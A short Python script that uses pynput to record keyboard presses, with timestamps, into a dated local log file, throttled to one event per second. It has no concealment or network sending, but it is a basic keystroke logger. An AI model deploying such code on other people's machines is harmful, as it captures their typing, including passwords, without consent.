from pynput.keyboard import Listener as KeyboardListener
import datetime
import logging
import pynput
import os
import time

formatter = logging.Formatter('%(asctime)s %(message)s', '%Y-%m-%d %H:%M:%S')
te =None

def setup_logger_k(name, log_file, level=logging.INFO):
    handler = logging.FileHandler(log_file)
    handler.setFormatter(formatter)
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)
    return logger


time_now  = datetime.datetime.now().strftime('%d_%m_%Y_keyboard.txt')
keyboard_logger = setup_logger_k('keyboard_logger', time_now)

def on_press(key):
    global te
    ts = datetime.datetime.now().strftime('%d_%m_%Y %H:%M:%S')
    if te == ts:
       pass
    else:
        keyboard_logger.info('Received event {}'.format(key))
    te =  datetime.datetime.now().strftime('%d_%m_%Y %H:%M:%S')


def on_release(key):
    pass


keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)


def main():
    keyboard_listener.start()
    keyboard_listener.join()


if __name__ == '__main__':
    main() 